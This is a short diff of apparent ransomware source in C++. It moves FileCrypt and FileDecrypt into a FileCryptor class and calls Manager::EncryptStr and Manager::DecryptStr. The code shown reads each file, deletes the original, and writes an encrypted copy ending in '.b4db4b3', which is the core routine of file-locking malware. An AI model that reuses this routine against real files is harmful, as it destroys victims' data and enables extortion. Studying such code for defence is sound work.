@@ -25,7 +25,7 @@ SOFTWARE.
 #include "FileCryptor.h"
 #include "Manager.h"
 
-BOOL FileCrypt(std::string path, std::string key) {
+BOOL FileCryptor::FileCrypt(std::string path, std::string key) {
 	std::ifstream readf(path, std::ifstream::binary);
 	if (readf.is_open()) {
 		std::string file_text = "";
@@ -37,7 +37,7 @@ BOOL FileCrypt(std::string path, std::string key) {
 		readf.close();
 
 		if (DeleteFileA(path.c_str())) {
-			std::string ciphered_text = EncryptStr(file_text, key);
+			std::string ciphered_text = Manager::EncryptStr(file_text, key);
 
 			if (ciphered_text != "") {
 				std::ofstream newfile(std::string(path + ".b4db4b3"), std::ofstream::binary);
@@ -52,7 +52,7 @@ BOOL FileCrypt(std::string path, std::string key) {
 	return FALSE;
 }
 
-BOOL FileDecrypt(std::string path, std::string key) {
+BOOL FileCryptor::FileDecrypt(std::string path, std::string key) {
 	std::ifstream readf(path, std::ifstream::binary);
 	if (readf.is_open()) {
 		std::string file_text = "";
@@ -64,7 +64,7 @@ BOOL FileDecrypt(std::string path, std::string key) {
 		readf.close();
 
 		if (DeleteFileA(path.c_str())) {
-			std::string deciphered_text = DecryptStr(file_text, key);
+			std::string deciphered_text = Manager::DecryptStr(file_text, key);
 
 			if (deciphered_text != "") {
 				path.replace(path.find(".b4db4b3"), 8, "");
